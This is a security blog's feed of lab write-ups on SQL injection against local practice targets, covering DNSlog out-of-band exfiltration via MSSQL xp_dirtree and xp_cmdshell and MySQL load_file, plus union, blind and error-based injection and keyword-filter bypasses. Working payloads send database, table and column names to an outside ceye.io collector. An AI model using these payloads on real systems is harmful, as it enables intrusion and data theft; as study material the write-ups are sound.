<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>han个人博客</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2019-09-05T11:28:04.472Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>han</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Welcome</title>
    <link href="http://yoursite.com/2019/09/05/welcome/"/>
    <id>http://yoursite.com/2019/09/05/welcome/</id>
    <published>2019-09-05T11:27:00.000Z</published>
    <updated>2019-09-05T11:28:04.472Z</updated>
    
    <content type="html"><![CDATA[<!-- excerpt -->]]></content>
    
    <summary type="html">
    
      &lt;center&gt;&lt;font size=&quot;5&quot;&gt;记录  学习  分享&lt;/font&gt;&lt;/center&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>note39</title>
    <link href="http://yoursite.com/2019/09/05/note39/"/>
    <id>http://yoursite.com/2019/09/05/note39/</id>
    <published>2019-09-05T11:22:28.000Z</published>
    <updated>2019-09-05T11:22:28.889Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>note38</title>
    <link href="http://yoursite.com/2019/09/05/note38/"/>
    <id>http://yoursite.com/2019/09/05/note38/</id>
    <published>2019-09-05T11:22:23.000Z</published>
    <updated>2019-09-05T11:22:23.225Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>practice14</title>
    <link href="http://yoursite.com/2019/09/04/practice14/"/>
    <id>http://yoursite.com/2019/09/04/practice14/</id>
    <published>2019-09-04T10:48:00.000Z</published>
    <updated>2019-09-05T11:27:46.597Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 利用<code>mssql</code> 数据库的 <code>dnslog</code> 外带数据的方式进行注入，查询出库名表名；利用 <code>mysql</code> 数据库在 <code>windows</code> 系统中 <code>dnslog</code> 外带数据进行注入。</p><a id="more"></a><!--export--><!--toc--><h3 id="Mssql-的-dnslog-外带数据注入"><a href="#Mssql-的-dnslog-外带数据注入" class="headerlink" title="Mssql 的 dnslog 外带数据注入"></a><code>Mssql</code> 的 <code>dnslog</code> 外带数据注入</h3><h4 id="查询库名"><a href="#查询库名" class="headerlink" title="查询库名"></a>查询库名</h4><p>查总个数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select count(name) from master.dbo.sysdatabases );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog10.png" alt></p><p><img src="/images/193dnslog11.png" alt></p><p>查第一个库名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select name from master.dbo.sysdatabases where dbid=1 );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog12.png" alt></p><p><img src="/images/193dnslog13.png" alt></p><p>查询第二个库名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select name from master.dbo.sysdatabases where dbid=2 );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog15.png" alt></p><p><img src="/images/193dnslog14.png" alt></p><p>全部库名如下图所示：</p><p><img src="/images/193dnslog16.png" alt></p><p>八个库分别为：<code>master</code>，<code>tempdb</code>，<code>model</code>，<code>msdb</code>，<code>ReportServer</code>，<code>aspcms</code>，<code>ReportServerTempDB</code> 和 <code>test</code>。</p><h4 id="查询库-test-中的表名"><a href="#查询库-test-中的表名" class="headerlink" title="查询库 test 中的表名"></a>查询库 <code>test</code> 中的表名</h4><p>先查看个数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(Select count(Name) FROM test.dbo.SysObjects Where XType=&apos;U&apos; );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog8.png" alt></p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C193dnslog9.png" alt></p><p>总共四个表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(Select top 1 Name FROM test.dbo.SysObjects Where XType=&apos;U&apos;);exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog2.png" alt></p><p><img src="/images/193dnslog3.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(Select top 1 Name FROM test.dbo.SysObjects Where XType=&apos;U&apos; and name not in (&apos;emails&apos;) );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog4.png" alt></p><p><img src="/images/193dnslog5.png" alt></p><p>关于如何取下一个表名，还有一种更巧妙的方法，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(Select top 1 Name FROM test.dbo.SysObjects Where XType=&apos;U&apos; and name not in (select top 3 name from test.dbo.SysObjects Where XType=&apos;U&apos;) );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog6.png" alt></p><p><img src="/images/193dnslog7.png" alt></p><p>可知，这四个表分别为：<code>emails</code>，<code>users</code>，<code>uagents</code> 和 <code>referers</code>。</p><h4 id="查询-users-表中的列名"><a href="#查询-users-表中的列名" class="headerlink" title="查询 users 表中的列名"></a>查询 <code>users</code> 表中的列名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in (&apos;&apos;) );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog17.png" alt></p><p><img src="/images/193dnslog18.png" alt></p><p>依次执行下面命令，可以查的所有的列名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in (&apos;id&apos;, &apos;username&apos;) );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in (&apos;id&apos;, &apos;username&apos;, &apos;password&apos;) );exec(&apos;master..xp_dirtree &quot;//&apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p>列名分别为 ：<code>id</code>，<code>username</code> 和 <code>password</code>。</p><p><img src="/images/193dnslog19.png" alt></p><h4 id="使用-xp-subdirs"><a href="#使用-xp-subdirs" class="headerlink" title="使用 xp_subdirs"></a>使用 <code>xp_subdirs</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in (&apos;id&apos;, &apos;username&apos;) );exec(&apos;master..xp_subdirs &quot;//&apos; %2b @a %2b &apos;.subdirs.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog20.png" alt></p><p><img src="/images/193dnslog21.png" alt></p><h4 id="使用-xp-fileexist"><a href="#使用-xp-fileexist" class="headerlink" title="使用 xp_fileexist"></a>使用 <code>xp_fileexist</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in (&apos;id&apos;, &apos;username&apos;) );exec(&apos;master..xp_fileexist &quot;//&apos; %2b @a %2b &apos;.fileexist.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog23.png" alt></p><p><img src="/images/193dnslog22.png" alt></p><h4 id="使用-xp-cmdshell"><a href="#使用-xp-cmdshell" class="headerlink" title="使用 xp_cmdshell"></a>使用 <code>xp_cmdshell</code></h4><p>现在数据库中打开 <code>xp_cmdshell</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &apos;show advanced options&apos;,1</span><br><span class="line">RECONFIGURE</span><br><span class="line">EXEC sp_configure &apos;xp_cmdshell&apos;,1</span><br><span class="line">RECONFIGURE</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog24.png" alt></p><p>先在数据库中执行下面命令，看是否正确。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">declare @a varchar(1024);</span><br><span class="line">set @a=&apos;www.baidu.com&apos;;</span><br><span class="line">exec(&apos;sp_configure &quot;show advanced options&quot;,1&apos;);</span><br><span class="line">reconfigure;exec(&apos;sp_configure &quot;xp_cmdshell&quot;,1&apos;);</span><br><span class="line">reconfigure;exec (&apos;master..xp_cmdshell &quot;ping &apos; + @a + &apos;.cmdshell.9rq9q9.ceye.io&quot; &apos;)</span><br></pre></td></tr></table></figure><p>我们可以看到执行的结果。</p><p><img src="/images/193dnslog45.png" alt></p><p><img src="/images/193dnslog46.png" alt></p><p>在 <code>Hackbar</code>执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=&apos;www.baidu.com&apos;; exec(&apos;sp_configure &quot;show advanced options&quot;,1&apos;);reconfigure;exec(&apos;sp_configure &quot;xp_cmdshell&quot;,1&apos;);reconfigure;exec (&apos;master..xp_cmdshell &quot;ping &apos; %2b @a %2b &apos;.hackbarcmd.9rq9q9.ceye.io&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog47.png" alt></p><p><img src="/images/193dnslog48.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-6.asp?id=1; declare @a varchar(1024); set @a=&apos;www.baidu.com&apos;;exec (&apos;master..xp_cmdshell &quot;ping &apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io&quot; &apos;)</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog25.png" alt></p><p><img src="/images/193dnslog26.png" alt></p><h3 id="MySQL-的-dnslog-外带数据注入"><a href="#MySQL-的-dnslog-外带数据注入" class="headerlink" title="MySQL 的 dnslog 外带数据注入"></a><code>MySQL</code> 的 <code>dnslog</code> 外带数据注入</h3><p><code>window</code>下在 <code>phpstudy_pro</code> 中 <code>C:\phpstudy_pro\Extensions\MySQL8.0.12</code> 下的 <code>my.ini</code>中添加：</p><p><code>secure_file_priv=</code> 重启服务。</p><p><img src="/images/193dnslog49.png" alt></p><h4 id="查询库名-1"><a href="#查询库名-1" class="headerlink" title="查询库名"></a>查询库名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(CONCAT(&apos;\\\\&apos;,(SELECT schema_name FROM information_schema.schemata limit 0,1), &apos;.mysql.9rq9q9.ceye.io\\abc&apos;))</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog27.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(CONCAT(&apos;\\\\&apos;,(SELECT schema_name FROM information_schema.schemata limit 1,1), &apos;.mysql.9rq9q9.ceye.io\\abc&apos;))</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog28.png" alt></p><h4 id="查询-security-库中的表名"><a href="#查询-security-库中的表名" class="headerlink" title="查询 security 库中的表名"></a>查询 <code>security</code> 库中的表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(CONCAT(&apos;\\\\&apos;,(SELECT table_name FROM information_schema.tables WHERE table_schema=&apos;security&apos; limit 0,1), &apos;.mysql.9rq9q9.ceye.io\\abc&apos;))</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog43.png" alt></p><p><strong>注</strong>：也可以使用 <code>database()</code> 函数代替 <code>security</code>，不过要记住要先使用命令 <code>use security;</code> 否则会因当前没有使用的数据库造成失败。</p><h4 id="查询-emails-表中列名"><a href="#查询-emails-表中列名" class="headerlink" title="查询 emails 表中列名"></a>查询 <code>emails</code> 表中列名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(CONCAT(&apos;\\\\&apos;,(SELECT column_name FROM information_schema.columns WHERE table_schema=&apos;security&apos; and table_name = &apos;emails&apos; limit 0,1), &apos;.mysql.9rq9q9.ceye.io\\abc&apos;))</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog44.png" alt></p><h3 id="sqli-labs-Less-25"><a href="#sqli-labs-Less-25" class="headerlink" title="sqli-labs Less-25"></a><code>sqli-labs Less-25</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.204/sqli-labs/Less-25?id=1</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog30.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.204/sqli-labs/Less-25?id=1&apos;</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog31.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.204/sqli-labs/Less-25?id=1&apos; -- |</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog32.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.204/sqli-labs/Less-25?id=1&apos; and &apos;1&apos;=&apos;1 -- |</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog33.png" alt></p><p>发现页面变化了，并且把我们输入的 <code>and</code> 和 <code>or</code>给过滤掉了。改变单词内某些字母的大小写，依然无济于事。尝试用 <code>&amp;&amp;</code> 和 <code>||</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.204/sqli-labs/Less-25?id=1&apos; || &apos;1&apos;=&apos;1 -- |</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog35.png" alt></p><p>可以在网页上清除看到，<code>||</code> 并没有被过滤掉。</p><p>这里可以选择联合查询</p><p><img src="/images/193dnslog36.png" alt></p><p>由于数据库错误会提示报错信息，所以也可以选择报错注入。在这里我们通过 <code>&amp;&amp;</code> 和<code>||</code>注入。</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.204/sqli-labs/Less-25?id=1&apos; &amp;&amp; updatexml(1, concat(&apos;~&apos;,(select database()), &apos;~&apos;), 1)  -- |</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog38.png" alt></p><p>可以发现 <code>&amp;&amp;</code> 及其后面的内容全部过滤掉了。</p><p>尝试使用 <code>||</code></p><p><img src="/images/193dnslog39.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.204/sqli-labs/Less-25?id=1&apos; || updatexml(1, concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;), &apos;~&apos;), 1)  -- |</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog40.png" alt></p><p>发现把 <code>information_schema</code> 中的 <code>or</code> 给过滤掉了，尝试下 <code>infoorrmation_schema</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.204/sqli-labs/Less-25?id=1&apos; || updatexml(1, concat(&apos;~&apos;,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=&apos;security&apos;), &apos;~&apos;), 1)  -- |</span><br></pre></td></tr></table></figure><p><img src="/images/193dnslog41.png" alt></p><p>同理我们也可以查到列名。</p><p><img src="/images/193dnslog42.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 利用&lt;code&gt;mssql&lt;/code&gt; 数据库的 &lt;code&gt;dnslog&lt;/code&gt; 外带数据的方式进行注入，查询出库名表名；利用 &lt;code&gt;mysql&lt;/code&gt; 数据库在 &lt;code&gt;windows&lt;/code&gt; 系统中 &lt;code&gt;dnslog&lt;/code&gt; 外带数据进行注入。&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
    
      <category term="Access 注入 - Mssql 注入" scheme="http://yoursite.com/tags/Access-%E6%B3%A8%E5%85%A5-Mssql-%E6%B3%A8%E5%85%A5/"/>
    
      <category term="dnslog" scheme="http://yoursite.com/tags/dnslog/"/>
    
  </entry>
  
  <entry>
    <title>note37</title>
    <link href="http://yoursite.com/2019/09/04/note37/"/>
    <id>http://yoursite.com/2019/09/04/note37/</id>
    <published>2019-09-03T23:44:16.000Z</published>
    <updated>2019-09-04T00:56:17.956Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 二次注入，<code>Access</code>注入和 <code>Mssql</code> 注入</p><a id="more"></a><!--export--><!--toc--><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>第一个注入点因为经过过滤处理，因此无法触发 sql 注入漏洞，比如 <code>addslashes</code> 函数，将单引号等预定义字符转义为 <code>\&#39;</code> 。存入数据库后，数据会还原，比如输入 <code>abc&#39;</code> ，如果发现一个新的注入点使用了该参数而且没有转义，则就会触发二次注入。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Abstract&lt;/strong&gt;: 二次注入，&lt;code&gt;Access&lt;/code&gt;注入和 &lt;code&gt;Mssql&lt;/code&gt; 注入&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://yoursite.com/categories/Web-Security/"/>
    
      <category term="笔记" scheme="http://yoursite.com/categories/Web-Security/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="二次注入 - Access 注入 - Mssql 注入" scheme="http://yoursite.com/tags/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-Access-%E6%B3%A8%E5%85%A5-Mssql-%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>练习13</title>
    <link href="http://yoursite.com/2019/09/03/practice13/"/>
    <id>http://yoursite.com/2019/09/03/practice13/</id>
    <published>2019-09-03T10:52:23.000Z</published>
    <updated>2019-09-03T23:59:14.247Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Abstract</strong>: 对 <code>Mssql</code> 和 <code>Access</code> 数据库使用报错注入和联合查询方法查询库名表名字段名。</p><a id="more"></a><!--export--><!--toc--><h3 id="MSSQL-SQLi-Labs-环境注入"><a href="#MSSQL-SQLi-Labs-环境注入" class="headerlink" title="MSSQL-SQLi-Labs 环境注入"></a><code>MSSQL-SQLi-Labs</code> 环境注入</h3><h4 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h4><p>在 <code>id=1&#39;</code> 后加上 <code>&#39;</code>，页面报错，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;</span><br></pre></td></tr></table></figure><p>继续在后面补上 <code>-- |</code> 页面正常显示。</p><p><img src="/images/191mssql1.png" alt></p><h4 id="确认字段数"><a href="#确认字段数" class="headerlink" title="确认字段数"></a>确认字段数</h4><p>先写上 4，发现页面报错，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  order by 4 -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql2.png" alt></p><p>修改为 3，页面正常显示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  order by 3 -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql3.png" alt></p><h4 id="确认页面能够显示的位置"><a href="#确认页面能够显示的位置" class="headerlink" title="确认页面能够显示的位置"></a>确认页面能够显示的位置</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  union select (@@version),2,3 -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql4.png" alt></p><h4 id="布尔盲注查-version"><a href="#布尔盲注查-version" class="headerlink" title="布尔盲注查 version"></a>布尔盲注查 <code>version</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  and len(@@version)&gt;211 -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql5.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  and len(@@version)&gt;212 -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql6.png" alt></p><p>故可以推断，<code>version</code> 长度为 <code>212</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  and ascii(substring((@@version), 1, 1))&gt;76 -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql7.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  and ascii(substring((@@version), 1, 1))&gt;77 -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql8.png" alt></p><p>可以推断出第一个字符的 <code>ACSII</code> 码为 <code>77</code>，即第一个字母为 <code>M</code>。通过这个方法，我们可以确定其他字符。</p><h4 id="联合查询判断库名"><a href="#联合查询判断库名" class="headerlink" title="联合查询判断库名"></a>联合查询判断库名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=-1&apos; union select 1, schema_name, 3 from (select top 1 schema_name from information_schema.schemata order by 1) as shit order by 1 desc -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql10.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=-1&apos; union select 1, schema_name, db_name() from (select top 1 schema_name from information_schema.schemata where schema_name not in (&apos;dbo&apos;, &apos;accessadmin&apos;, &apos;guest&apos;, &apos;db_accessadmin&apos;,&apos;db_backupoperator&apos;, &apos;db_datareader&apos;, &apos;db_datawriter&apos;,&apos;db_ddladmin&apos;)) as shit order by 1 desc -- |</span><br></pre></td></tr></table></figure><p>逐个确认库名</p><p><img src="/images/191mssql22.png" alt></p><h4 id="联合查询判断表名"><a href="#联合查询判断表名" class="headerlink" title="联合查询判断表名"></a>联合查询判断表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=-1&apos; union select 1, table_name, db_name() from (select top 1 table_name from information_schema.tables order by 1) as shit order by 1 desc -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql11.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=-1&apos; union select 1, table_name, db_name() from (select top 1 table_name from information_schema.tables where table_name not in (&apos;emails&apos;, &apos;uagents&apos;, &apos;referers&apos;, &apos;users&apos;) and table_schema=&apos;dbo&apos;) as shit order by 1 desc -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql23.png" alt></p><h4 id="联合查询判断字段名"><a href="#联合查询判断字段名" class="headerlink" title="联合查询判断字段名"></a>联合查询判断字段名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=-1&apos; union select 1, column_name, 3 from (select top 1 column_name from information_schema.columns order by 1) as shit order by 1 desc -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql12.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-1.asp?id=-1&apos; union select 1, column_name, db_name() from (select top 1 column_name from information_schema.columns where column_name not in (&apos;id&apos;, &apos;username&apos;, &apos;password&apos;) and table_name=&apos;users&apos;) as shit order by 1 desc -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql24.png" alt></p><h4 id="报错注入判断库名"><a href="#报错注入判断库名" class="headerlink" title="报错注入判断库名"></a>报错注入判断库名</h4><p>先判断是否为 <code>mssql</code>，执行下面语句若显示正常则为 <code>mssql</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos; and exists(select * from sysobjects) -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql13.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos; and 1=convert(int, (select @@version)) -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql14.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  and 1=convert(int,(select top 1 schema_name from information_schema.schemata ))  -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql15.png" alt></p><p>查到第一库为 <code>dbo</code>，通过 <code>not in</code> 条件，把每次查出来的表名加进去，这样就可以慢慢把所有表的遍历出来。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  and 1=convert(int,(select top 1 schema_name from information_schema.schemata where schema_name not in(&apos;dbo&apos;) )) -- |</span><br></pre></td></tr></table></figure><p><img src="/images/191mssql16.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  and 1=convert(int,(select top 1 schema_name from information_schema.schemata where schema_name not in(&apos;dbo&apos;, &apos;db_accessadmin&apos;) )) -- |</span><br></pre></td></tr></table></figure><p>以此类推可以查询出全部库名</p><h4 id="报错注入查询表名"><a href="#报错注入查询表名" class="headerlink" title="报错注入查询表名"></a>报错注入查询表名</h4><p>第一张表是 <code>emails</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-1.asp?id=1&apos;  and 1=convert(int,(select top 1 table_name from information_schema.tables where 